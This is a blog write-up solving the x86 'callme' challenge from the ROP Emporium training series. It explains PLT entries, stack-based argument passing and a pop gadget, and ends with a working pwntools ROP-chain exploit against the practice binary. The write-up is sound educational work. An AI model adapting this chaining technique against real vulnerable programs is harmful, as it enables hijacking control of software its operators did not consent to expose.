---
layout: post
title:  "ROP Emporium callme Writeup (x86)"
date:   2024-06-02 00:00:00 -0400
categories: rop-emporium callme
tags: rop-emporium callme x86 writeup buffer-overflow rop reverse-engineering 32-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[third challenge](https://ropemporium.com/challenge/callme.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/callme.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call the functions `callme_one()`,
`callme_two()`, and `callme_three()` in that order with
the arguments `0xdeadbeef`, `0xcafebabe`, and `0xd00df00d`.

We should essentially be running
```c
callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d);
callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d);
callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d);
```

## Exploit Crafting
The offset for `x86` challenges will be `44 bytes`. If
you want to know how to get this value see the
[`x86` ret2win writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

### Function Address
> What are the plt addresses of the functions?
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. To list functions with their
addresses we can run `afl`
![func-addr](/images/callme/x86-addr.png)

The function addresses we need are
```
callme_one: 0x080484f0
callme_two: 0x08048550
callme_three: 0x080484e0
```

### Procedure Linkage Table
These addresses aren't addresses of `call` instructions,
but rather `plt` entries. These `plt` entries are
used to lookup the address of a function located
in an external library. You can tell when an address
is a `plt` address by the `sym.imp` string in `r2`

If you want a deeper understanding
of the `plt` (procedure linkage table) and the `got`
(global offset table) you can check the `How lazy binding
works` section in the 
[ROP Emporium Beginners Guide](https://ropemporium.com/guide.html#Appendix%20A){:target="_blank"}{:rel="noopener noreferrer"}
as well as this
[fantastic blog post](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html){:target="_blank"}{:rel="noopener noreferrer"}

Why are we using the `plt` entries for the functions
rather than the calls in `usefulFunction`? When
a `call` instruction is executed, it'll execute the
function while also placing the return address onto
the stack! So once `callme_one()` is finished it
will continue to execute instructions in `usefulFunction`

![call-problem](/images/callme/x86-call-problem.png)

So after we finish `callme_one()`, the program
will exit. This would could be okay for one function
call but we want to chain a few together

### Adding Arguments
> Which instruction removes a value from the stack
> and moves the stack pointer?
{: .prompt-tip }

#### x86 Calling Convention
In `x86`, we pass each argument onto the stack.
There are other
[`x86` calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions){:target="_blank"}{:rel="noopener noreferrer"}
but passing arguments is all we need to know for
our purposes

The previous challenge used a `call` instruction to
invoke a function, but that won't work if we want
to chain multiple functions together. Using a `call`
also has the hidden effect of automatically adding
a return address to the stack!

#### Argument Debugging
Since we aren't using `call`, we need to manually maintain
the stack. A first attempt at constructing a ROP chain for
this challenge might look something like this 

![first-stack](/images/callme/x86-first-stack.png)

But when we try to run this, `callme_one`'s first
argument is incorrect! It points to the second arg
(`0xcafebabe`) instead of the first (`0xdeadbeef`)
![arg-error](/images/callme/x86-arg-error.png)

If we try to add some junk data (`0x66666666`) between
`callme_one` and `0xdeadbeef` we get a return error

![junk-stack](/images/callme/x86-junk-stack.png)

![junk-error](/images/callme/x86-junk-error.png)

If we replace the junk data with the address of
`callme_two`, the second function will get called
but the stack will be a little wonky...

![ret-stack](/images/callme/x86-ret-stack.png)

![ret-error](/images/callme/x86-ret-error.png)

What essentially happened is once `callme_one` finished
(with the proper arguments) the `callme_one` address
was `pop`ped off the stack and our previous junk entry
is now at the top of the stack. That address is called
and we have the same stack argument offset 
issues as before!

![arg2-error](/images/callme/x86-arg2-error.png)

#### Gadget
So how do we solve this? Here's
[a great article](http://phrack.org/issues/58/4.html#article){:target="_blank"}{:rel="noopener noreferrer"}
which goes over some methods for
chaining functions in a 32 bit environment.

We're going to be taking advantage of the `pop` command.
You should know by now that it takes a value off of the
stack and places it into a specified register. What
makes this really powerful is that it not only sets a
register, it'll update the stack pointer to remove this
value! This will allow us to delete our stack entry after
a function call so the stack is properly set for our
next function call

Since we have three arguments, we should find a gadget
which `pop`s three arguments into any register. In
`radare2` we can use the `/R` command

```
/R pop
```
![pop-addr](/images/callme/x86-pop-addr.png)

If we set this gadget to run once `callme` ends, it'll
remove all of the arguments for that function and we're
free to call more arbitrary functions with arbitrary
arguments! The stack should look like this in the final
exploit

![pop-stack](/images/callme/x86-pop-stack.png)

## Exploit
Now we have everything we need to build the exploit
```python
from pwn import *

# useful addresses
callme1_addr = 0x080484f0
callme2_addr = 0x08048550
callme3_addr = 0x080484e0
pop_3 = 0x080487f9

# adds function arguments onto the stack
def add_args(args):
    # fixes stack after function returns
    payload = p32(pop_3)
    # adds args
    for a in args:
        payload += p32(a)
    return payload

# required callme args in the proper order
args = [0xdeadbeef, 0xcafebabe, 0xd00df00d]

# construct payload
payload = b'A' * 44
# callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)
payload += p32(callme1_addr)
payload += add_args(args)

payload += p32(callme2_addr)
payload += add_args(args)

payload += p32(callme3_addr)
payload += add_args(args)

# send payload + receive flag
io = process('./callme32')
io.send(payload)
io.recvuntil(b'callme_two() called correctly\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```
![flag](/images/callme/x86-flag.png)

## Conclusion
This challenge takes things a step further than
just calling an arbitrary function by introducting the 
ability to set arbitrary arguments for that function.
This isn't as simple as it seems as we also need to
maintain the stack under `x86` with a `pop` gadget!

[previous challenge (split)]({% post_url 2024-06-01-rop-emporium-split-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

[next challenge (write4)]({% post_url 2024-05-31-rop-emporium-ret2win-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

[callme x64]({% post_url 2024-06-02-rop-emporium-callme-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
